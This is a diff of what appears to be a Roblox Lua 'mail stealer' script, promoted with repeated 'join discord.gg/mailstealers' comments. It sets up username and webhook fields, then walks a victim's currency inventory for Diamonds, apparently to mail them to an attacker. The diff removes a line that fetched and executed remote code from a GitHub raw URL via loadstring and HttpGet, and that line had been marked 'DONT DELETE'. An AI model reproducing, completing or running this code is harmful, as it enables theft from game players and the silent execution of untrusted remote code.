@@ -1,3 +1,9 @@
+-- join discord.gg/mailstealers
+-- join discord.gg/mailstealers
+-- join discord.gg/mailstealers
+-- join discord.gg/mailstealers
+-- join discord.gg/mailstealers
+
 Username = ""
 Username2 = ""
 Webhook = ""
@@ -56,10 +62,7 @@ local HttpService = game:GetService("HttpService")
 local MailMessage = "ego on top!"
 local message = require(game.ReplicatedStorage.Library.Client.Message)
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
-
--- DONT DELETE OR EDIT ANYTHING BELOW!
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/janeqnoctrl/x-sources/refs/heads/main/AntiLeaveFunction.lua"))()
+-- JOIN discord.gg/mailstealers 
 
 for id, table in pairs(Inventory.Currency) do
     if table.id == "Diamonds" then
